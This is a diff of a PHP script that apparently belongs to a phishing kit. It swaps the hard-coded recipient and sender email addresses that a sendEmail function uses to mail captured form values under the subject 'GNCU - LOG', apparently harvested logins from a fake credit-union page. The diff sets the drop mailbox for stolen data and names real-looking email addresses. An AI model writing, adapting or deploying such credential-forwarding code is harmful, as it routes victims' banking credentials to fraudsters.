@@ -9,12 +9,8 @@ function sanitize($value) {
 }
 
 
-// $EMAIL = "gottmacht.empire@gmail.com";
-// $SENDER_EMAIL = "gottmacht.empire@yandex.com";
-
-$EMAIL = "jacedev151@gmail.com";
-$SENDER_EMAIL = "jacetech151@gmail.com";
-
+$EMAIL = "gottmacht.empire@gmail.com";
+$SENDER_EMAIL = "gottmacht.empire@yandex.com";
 
 function sendEmail($prevValues, $subject = "GNCU - LOG") {
     global $EMAIL;
